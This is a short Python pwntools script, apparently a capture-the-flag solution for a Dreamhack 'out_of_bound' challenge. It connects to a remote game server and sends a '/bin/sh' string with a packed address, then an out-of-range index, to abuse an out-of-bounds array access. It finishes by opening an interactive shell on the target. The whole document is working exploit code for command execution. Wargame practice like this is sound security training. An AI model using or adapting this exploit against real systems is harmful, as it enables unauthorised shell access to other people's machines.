from pwn import*

#sp = process("./out_of_bound")
p = remote('host3.dreamhack.games',20329)
#gdb.attach(p,api=True)

name = 0x804a0ac
payload = b"/bin/sh\x00" + p32(name)
p.sendline(payload)

payload = b'21'
p.sendline(payload)
p.interactive()
